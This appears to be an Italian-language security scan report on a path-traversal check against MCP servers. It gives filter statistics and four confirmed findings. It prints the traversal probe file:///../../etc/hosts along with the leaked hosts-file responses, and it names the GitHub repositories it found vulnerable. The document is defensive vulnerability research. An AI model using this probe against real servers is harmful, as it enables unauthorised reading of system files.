# path-traversal (R-01) - Analisi Finding Filtrati

**Data analisi**: 2026-07-27 12:30

## Descrizione del check

Probe attivo con file:///../../etc/hosts. Il filtro tiene solo risposte con contenuto REALE di file di sistema (127.0.0.1 localhost, root:x:0:0, etc.).

## Statistiche filtro

| Metrica | Valore |
|---------|--------|
| Finding originali | 102 |
| Finding filtrati (tenuti) | 4 |
| Rimossi | 98 |
| Tasso di riduzione | 96.1% |

## Motivi di filtraggio

| Motivo | Count |
|--------|-------|
| `REJECTED:server_rejected_traversal` | 52 |
| `REJECTED:result_empty_no_file_read` | 37 |
| `REJECTED:result_no_file_content` | 9 |
| `KEPT:real_hosts_file_content` | 4 |

## Server unici con vulnerabilita' reali: 4

## Esempi di finding tenuti (max 15)

### 1. [-worksona-mcp-server](https://github.com/worksona/-worksona-mcp-server)

- **ID**: `R-01`
- **Severity**: `high`
- **Filter reason**: `real_hosts_file_content`
- **Details**: ```{"jsonrpc": "2.0", "id": 1, "result": {"contents": [{"type": "text", "text": "# Your system has configured 'manage_etc_hosts' as True.\n# As a result, if you wish for changes to this file to persist\n# then you will need to either\n# a.) make changes to the master file in /etc/cloud/templates/hosts.debian.tmpl\n# b.) change or remove the value of 'manage_etc_hosts' in\n#     /etc/cloud/cloud.cfg or cloud-config from user-data\n#\n127.0.1.1 martignoni-carminati-6.vm.local.necst.it martignoni-carminati-6\n127.0.0.1 localhost\n\n# The following lines are desirable for IPv6 capable hosts\n::1 localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\n"}]}}```

### 2. [video-transcriber-mcp](https://github.com/nhatvu148/video-transcriber-mcp)

- **ID**: `R-01`
- **Severity**: `high`
- **Filter reason**: `real_hosts_file_content`
- **Details**: ```{"result": {"contents": [{"uri": "file:///../../etc/hosts", "mimeType": "text/plain", "text": "# Your system has configured 'manage_etc_hosts' as True.\n# As a result, if you wish for changes to this file to persist\n# then you will need to either\n# a.) make changes to the master file in /etc/cloud/templates/hosts.debian.tmpl\n# b.) change or remove the value of 'manage_etc_hosts' in\n#     /etc/cloud/cloud.cfg or cloud-config from user-data\n#\n127.0.1.1 martignoni-carminati-6.vm.local.necst.it martignoni-carminati-6\n127.0.0.1 localhost\n\n# The following lines are desirable for IPv6 capable hosts\n::1 localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\n"}]}, "jsonrpc": "2.0", "id": 1}```

### 3. [mcp-document-server](https://github.com/danielitus/mcp-document-server)

- **ID**: `R-01`
- **Severity**: `high`
- **Filter reason**: `real_hosts_file_content`
- **Details**: ```{"result": {"contents": [{"uri": "file:///../../etc/hosts", "mimeType": "text/plain", "text": "# Your system has configured 'manage_etc_hosts' as True.\n# As a result, if you wish for changes to this file to persist\n# then you will need to either\n# a.) make changes to the master file in /etc/cloud/templates/hosts.debian.tmpl\n# b.) change or remove the value of 'manage_etc_hosts' in\n#     /etc/cloud/cloud.cfg or cloud-config from user-data\n#\n127.0.1.1 martignoni-carminati-6.vm.local.necst.it martignoni-carminati-6\n127.0.0.1 localhost\n\n# The following lines are desirable for IPv6 capable hosts\n::1 localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\n"}]}, "jsonrpc": "2.0", "id": 1}```

### 4. [spec-workflow-mcp](https://github.com/uniswap/spec-workflow-mcp)

- **ID**: `R-01`
- **Severity**: `high`
- **Filter reason**: `real_hosts_file_content`
- **Details**: ```{"result": {"contents": [{"uri": "file:///../../etc/hosts", "mimeType": "text/markdown", "text": "# Your system has configured 'manage_etc_hosts' as True.\n# As a result, if you wish for changes to this file to persist\n# then you will need to either\n# a.) make changes to the master file in /etc/cloud/templates/hosts.debian.tmpl\n# b.) change or remove the value of 'manage_etc_hosts' in\n#     /etc/cloud/cloud.cfg or cloud-config from user-data\n#\n127.0.1.1 martignoni-carminati-6.vm.local.necst.it martignoni-carminati-6\n127.0.0.1 localhost\n\n# The following lines are desirable for IPv6 capable hosts\n::1 localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n\n"}]}, "jsonrpc": "2.0", "id": 1}```

## Interpretazione

I finding tenuti mostrano server dove il probe con path traversal (file:///../../etc/hosts) ha restituito contenuto reale di file di sistema. Questo indica una vulnerabilita' di path traversal confermata.

## Lista completa server vulnerabili

- https://github.com/danielitus/mcp-document-server
- https://github.com/nhatvu148/video-transcriber-mcp
- https://github.com/uniswap/spec-workflow-mcp
- https://github.com/worksona/-worksona-mcp-server
